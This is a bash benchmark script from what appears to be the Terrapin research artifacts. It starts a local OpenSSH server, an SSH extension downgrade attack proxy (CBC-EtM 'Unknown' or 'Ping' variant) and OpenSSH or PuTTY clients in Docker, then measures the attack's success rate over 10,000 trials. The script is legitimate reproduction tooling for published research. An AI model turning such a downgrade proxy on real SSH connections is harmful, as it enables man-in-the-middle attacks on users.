#!/bin/bash

SERVER_IMPL_NAME="OpenSSH 9.5p1"
SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1"
SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=2200

POC_CONTAINER_NAME="terrapin-artifacts-poc"
POC_PORT=2201

CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

TRIALS=10000
SUCCESS=0

function ensure_images {
  bash $(dirname "$0")/../impl/build.sh
  bash $(dirname "$0")/../pocs/build.sh
}

function print_info {
  echo
  echo "--- SSH extension downgrade attack CBC-EtM benchmark ---"
  echo
  echo "[i] This script can be used to reproduce the evaluation results presented in section 5.2 of the paper"
  echo "[i] The script will perform the following steps:"
  echo -e "\t 1. Start $SERVER_IMPL_NAME server on port $SERVER_PORT"
  echo -e "\t 2. Select and start PoC proxy on port $POC_PORT"
  echo -e "\t 3. Start a SSH client a total of $TRIALS times to connect to the PoC proxy and capture success rate"
  echo "[i] All container will run in --network host to allow for easy capturing via Wireshark on the lo interface"
  echo "[i] Make sure that ports $SERVER_PORT and $POC_PORT on the host are available and can be used by the containers"
  echo
}

function run_server {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT"
  docker run -d \
    --network host \
    --name "$SERVER_CONTAINER_NAME" \
    $SERVER_IMAGE -p $SERVER_PORT -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com > /dev/null 2>&1
}

function select_and_run_poc_proxy {
  echo "[i] This script supports the following extension downgrade attack variants as PoC:"
  echo -e "\t1) CBC-EtM (Unknown)"
  echo -e "\t2) CBC-EtM (Ping)"
  read -p "[+] Please select PoC variant to test [1-2]: " POC_VARIANT

  case $POC_VARIANT in
    1)
      POC_VARIANT_NAME="CBC-EtM (Unknown)"
      POC_IMAGE="terrapin-artifacts/ext-downgrade-cbc-unknown" ;;
    2)
      POC_VARIANT_NAME="CBC-EtM (Ping)"
      POC_IMAGE="terrapin-artifacts/ext-downgrade-cbc-ping" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected PoC variant: '$POC_VARIANT_NAME'"

  echo "[+] Starting extension downgrade attack proxy on port $POC_PORT. Connection will be proxied to 127.0.0.1:$SERVER_PORT"
  docker run -d \
    --network host \
    --name $POC_CONTAINER_NAME \
    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT > /dev/null 2>&1
}

function bench_client {
  echo "[i] This scripts supports the following clients for benchmarking:"
  echo -e "\t1) OpenSSH 9.5p1"
  echo -e "\t2) OpenSSH 9.4p1"
  echo -e "\t3) PuTTY 0.79"
  read -p "[+] Please select client for benchmakring [1-3]: " CLIENT_IMPL

  case $CLIENT_IMPL in
    1)
      CLIENT_IMPL_NAME="OpenSSH 9.5p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1" ;;
    2)
      CLIENT_IMPL_NAME="OpenSSH 9.4p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.4p1" ;;
    3)
      CLIENT_IMPL_NAME="PuTTY 0.79"
      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac      

  echo "[+] Benchmarking PoC success rate against $CLIENT_IMPL_NAME client using PoC proxy at 127.0.0.1:$POC_PORT"
  case $CLIENT_IMPL in
    1|2)
      for i in `seq 1 $TRIALS`
      do
        docker run \
          --network host \
          --name "$CLIENT_CONTAINER_NAME" \
          $CLIENT_IMAGE -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $POC_PORT victim@127.0.0.1 > /dev/null 2>&1
        docker logs -n 1 "$CLIENT_CONTAINER_NAME" 2>&1 | grep "Permission denied" > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
          SUCCESS=$((SUCCESS + 1))
        fi
        docker rm "$CLIENT_CONTAINER_NAME" > /dev/null 2>&1
        echo -e -n "\r[+] Progress: $i / $TRIALS connection attempts done"
      done ;;
    3)
      for i in `seq 1 $TRIALS`
      do
        docker run \
          --network host \
          --name "$CLIENT_CONTAINER_NAME" \
          $CLIENT_IMAGE -P $POC_PORT -batch victim@127.0.0.1 > /dev/null 2>&1
        docker logs -n 1 "$CLIENT_CONTAINER_NAME" 2>&1 | grep "Cannot answer interactive prompts in batch mode" > /dev/null 2>&1
        if [[ $? -eq 0 ]]; then
          SUCCESS=$((SUCCESS + 1))
        fi
        docker rm "$CLIENT_CONTAINER_NAME" > /dev/null 2>&1
        echo -e -n "\r[+] Progress: $i / $TRIALS connection attempts done"
      done ;;
  esac
  echo
  echo "[+] Benchmarking done: $SUCCESS out of $TRIALS connection attempts successful"  
}

function stop_containers {
  echo "[+] Stopping any remaining artifact containers"
  docker stop \
    "$SERVER_CONTAINER_NAME" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME" > /dev/null 2>&1
}

function remove_containers {
  echo "[+] Removing any remaining artifact containers"
  docker rm \
    "$SERVER_CONTAINER_NAME" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME" > /dev/null 2>&1
}

ensure_images
print_info
select_and_run_poc_proxy
run_server
sleep 5
bench_client
stop_containers
remove_containers
